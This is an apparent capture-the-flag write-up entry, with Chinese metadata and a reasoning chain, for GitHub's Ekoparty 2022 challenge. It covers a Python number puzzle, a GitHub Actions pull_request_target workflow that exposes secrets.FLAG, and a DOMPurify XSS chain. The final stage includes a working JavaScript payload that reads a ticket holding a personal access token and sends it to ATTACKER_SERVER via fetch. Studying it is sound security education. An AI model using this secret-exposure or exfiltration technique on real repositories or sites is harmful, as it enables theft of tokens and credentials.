---
title: GitHub and the Ekoparty 2022 Capture the Flag
contest: Ekoparty 2022 CTF (GitHub)
year: 2022
difficulty: hard
vuln_type: web_unknown
tags:
- github
- actions
- pull_request_target
- dompurify
- ticket
- xss
- 加密
attack_chain:
- '第1关: "lesson"字符串循环+1024次循环+32062次+43052次+36582次+813+554772+789+3753+5711'
- '还原p: 3562927236051182334153575355087347127407987755959461320351305838619130268209476696833779953363710389416751'
- hex(p)[2:] → URL部分
- '第2关: GitHub Actions workflow_run + pull_request_target'
- 攻击PR触发job运行环境拿secrets.FLAG
- '第3关: /api/dompurify_config返回{configuration:{}} 允许XSS'
- '攻击者构造h4含PAT: env.get(''FINAL_EXAM_PAT'')'
- admin bot访问ticket
- fetch /api/profile/2拿about
- 解析ticket_id引用ticket.content
- 'exfil: fetch ATTACKER_SERVER/leak?foo=...'
key_payload: 'hex(p)[2:] + "/" + hex(t)[2:]  # URL'
one_liner: GitHub Ekoparty 2022：3关Python加密+Actions+DOMPurify XSS
lesson: GitHub Actions pull_request_target可拿secrets.FLAG
quality: high
full_path: GitHub_and_the_Ekoparty_2022_Capture_the_Flag.full.md
meta_path: GitHub_and_the_Ekoparty_2022_Capture_the_Flag.meta.md
images_removed: true
images_removed_count: 1
schema_version: v3.0.0-P0
summary: 'GitHub and the Ekoparty 2022 Capture the Flag。GitHub Ekoparty 2022：3关Python加密+Actions+DOMPurify XSS。关键路径：第1关: "lesson"字符串循环+1024次循环+32062次+43052次+36582次+813+554772+789+3753+5711 → 还原p: 3562927236...'
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 1
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/89234.html
reasoning_chain:
- 触发点：第1关 'lesson' 字符串 + Python 循环 → 假设：还原确定性计算
- 动作：t = int.from_bytes('lesson'.encode(), 'little') → 多次 for 循环 1024/32062/43052/...次累加
- 假设：所有累加项求和 → 观察：得 t = 3562927236051182334153575355087347127407987755959461320351305838619130268209476696833779953363710389416751
- 动作：hex(p)[2:] → URL 路径 → 假设：hex 字符串需 DECODE → 观察：转 bytes 得 URL 第1段
- 第2关：GitHub Actions workflow_run + pull_request_target → 假设：可拿 secrets.FLAG
- '动作：攻击者提 PR 触发 workflow_run → job runs on ubuntu-latest environment: CTF → env.FLAG = ${{ secrets.FLAG }}'
- 假设：CI 环境暴露 secrets 给攻击者控制 PR → 动作：观察 secrets.FLAG 输出
- 第3关：/api/dompurify_config 返回 {configuration:{}} 允许 XSS → 假设：DOMPurify 关闭
- 动作：admin bot 访问 ticket → fetch /api/profile/2 拿 about → 解析 ticket.content 引用
- '动作：构造 h4 含 PAT: env.get(''FINAL_EXAM_PAT'') → admin bot fetch 触发 exfil'
- 假设：fetch ATTACKER_SERVER/leak?foo=PAT → 观察：flag 泄露
failed_attempts:
- 试图直接跑 Python 还原 t → 失败：必须所有 for 循环项都执行完
- 试图改 workflow_run 触发条件 → 失败：必须按 PR 流程
- 试图禁用 DOMPurify sanitizer → 失败：API 已返回空 config
key_observations:
- GitHub Actions pull_request_target 触发器在 attacker PR 上可读 secrets
- DOMPurify configuration:{} 禁用净化 = XSS 直通
- admin bot 访问 ticket 是 XSS 触发链关键
- Python int.from_bytes + 多次 for 累加是确定性数值还原
- PAT 通过 fetch /leak?foo=... 外传到 attacker 服务器
prerequisites:
- GitHub Actions workflow_run / pull_request_target 触发器
- DOMPurify 配置选项
- JSONP / fetch exfil
- Python 大整数 + 字节编码
---
# GitHub and the Ekoparty 2022 Capture the Flag

> 原文: https://www.ctfiot.com/89234.html
> ID: 89234


```
import binascii

import math

YourFirst = "lesson"
t = int.from_bytes(YourFirst.encode(), byteorder='little')

for i in range(0,29):
 m = t % 23
 t*=m if m>2 else 2

for i in range(0,1024):
 m = i % 27
 t-= pow(m,m) if m>0 else m*m

for i in range(0,32062):
 m = i % 23
 t-= pow(m,25) if m>0 else m*m

for i in range(0,43052):
 m = i % 19
 t+= pow(m,24) if m>0 else m*m

for i in range(0,36582):
 m = i % 13
 t+= pow(m,24) if m>0 else m*m

for i in range(0,813):
 m = i % 11
 t-= pow(m,24) if m>0 else m*m

for i in range(0,554772):
 m = i % 7
 t-= pow(m,24) if m>0 else m*m

for i in range(0,789):
 m = i % 5
 t+= pow(m,24) if m>0 else m*m

for i in range(0,3753):
 m = i % 4
 t+= pow(m,24) if m>0 else m*m

for i in range(0,5711):
 m = i % 3
 t-= pow(m,24) if m>0 else m*m

for i in range(0,101234):
 t-= 128

t += 328

p = 3562927236051182334153575355087347127407987755959461320351305838619130268209476696833779953363710389416751

print(f'To access the course:\n "https://" + DECODE({hex(p)[2:]}) + "/{hex(t)[2:]}"')
name: Grade the Pull Request
on:
 workflow_run:
 workflows: ["PR Management"]
 types:
 - completed
 pull_request_target:
 branches:
 - main
jobs:
 build:
 runs-on: ubuntu-latest
 environment: CTF
 steps:
 - name: Checkout head branch of PR
 uses: actions/checkout@v3
 with:
 ref: ${{ github.event.pull_request.head.ref }}
 repository: ${{ github.event.pull_request.head.repo.full_name }}
 - name: Checkout main branch of this repo
 uses: actions/checkout@v3
 with:
 ref: main
 path: ./grading
 - uses: ruby/setup-ruby@v1
 with:
 ruby-version: 3.0.0
 - name: Grade the Pull Request
 run: |
 gem install octokit
 ruby grading/script/grading.rb
 env:
 FLAG: ${{ secrets.FLAG }}
name: PR Management

on:
 pull_request_target:
 types: [opened]
 branches-ignore:
 - 'main'

jobs:
 close_pr:
 runs-on: ubuntu-latest
 steps:
 - uses: superbrothers/close-pull-request@v3
 with:
 comment: "Pull Requests are only accepted against the `main` branch."
 cleanup_branch:
 runs-on: ubuntu-latest
 name: Delete non-grading branches
 steps:
 - name: Delete those pesky dead branches
 uses: phpdocker-io/github-actions-delete-abandoned-branches@v1
 id: delete_branches
 with:
 github_token: ${{ github.token }}
 last_commit_age_days: -1
 ignore_branches: main,grading
 dry_run: no
ticket = Ticket(
 id=uuid4().hex,
 from_id=2,
 content=f"<h4>Hi team!\nI'm having some issues with the authentication API, can you check if this PAT works for you?\nThanks in advance!\nPAT: {os.environ.get('FINAL_EXAM_PAT', 'A cool PAT')}</h4>"
)
@app.route("/api/ticket/<ticket_id>", methods=["GET"])
@login_required
def api_profile(ticket_id):
 ticket = Ticket.query.filter_by(id=ticket_id).first()

 if ticket:
 if ticket.from_id == g.user.id or g.user.id == 1:
 return jsonify(content=ticket.content)
 else:
 jsonify(error="You are not allowed to see this ticket")
@app.route("/api/ticket/<ticket_id>/report", methods=["GET"])
@login_required
def api_ticket_report(ticket_id):
 ticket = Ticket.query.filter_by(id=ticket_id).first()
 if ticket:
 if ticket.from_id == g.user.id:
 cli.set(request.remote_addr, ticket_id)
 return jsonify(success="An agent will review your report soon")
 else:
 return jsonify(error="You are not allowed to see this ticket")
driver.get("/signin")

WebDriverWait(driver, 10).until(
 ec.element_to_be_clickable((By.ID, "usernameInput")))
driver.find_element("id", "usernameInput").send_keys(
 os.environ.get("ADMIN_BOT_USER"))
driver.find_element("id", "passwordInput").send_keys(
 os.environ.get("ADMIN_BOT_PASSWORD"))
driver.find_element("id", "submitButton").click()
driver.get("/ticket/{ticket_id}")

sleep(os.environ.get("BROWSER_SLEEP"))
<!-- TODO: Improve ticket rendering and add button to report to an agent -->



<script>
 const getDOMPurifyConfig = async (url) => {
 const response = await getJSONfromURL(url)
 return response.configuration
 }
 const sanitize = async (unsafe_html) => {
 const configuration = await getDOMPurifyConfig(window.DOMPurifyConfigURL || "/api/dompurify_config")
 return DOMPurify.sanitize(unsafe_html, configuration)
 }

 const main = async () => {
 // get about from user
 const user = await getJSONfromURL('/api/profile/{{ user.id }}')
 document.getElementById("about").innerHTML = await sanitize(user.about)

 // get ticket contents
 const ticket = await getJSONfromURL('/api/ticket/{{ ticket_id }}')
 document.getElementById("ticket").innerHTML = await sanitize(ticket.content)
 }

 main()
</script>
# Note to researchers, default configuration is enough to prevent XSS attacks
@app.route("/api/dompurify_config", methods=["GET"])
def dompurify_config():
 return jsonify(configuration={})
{% if tickets %}

 {% for ticket in tickets -%}
 [{{ticket.id }}](/ticket/{{ ticket.id }})
 {% endfor %}

{% endif %}
r = await fetch('/profile/2');
text = await r.text();

const parser = new DOMParser();
const doc = parser.parseFromString(text, 'text/html');
const ticket_id = doc.getElementById("ticket").href.split("/")[4];
r = await fetch('/api/ticket/' + ticket_id);
json = await r.json();

await fetch('{ATTACKER_SERVER}/leak?foo=' + encodeURIComponent(JSON.stringify(json)));
ImmutableMultiDict([('foo', '{"content":"<h4>Hi team!\\nI\'m having some issues with the authentication API, can you check if this PAT works for you?\\nThanks in advance!\\nPAT: </h4>"}')])
```


---
## 附图

[图片已移除]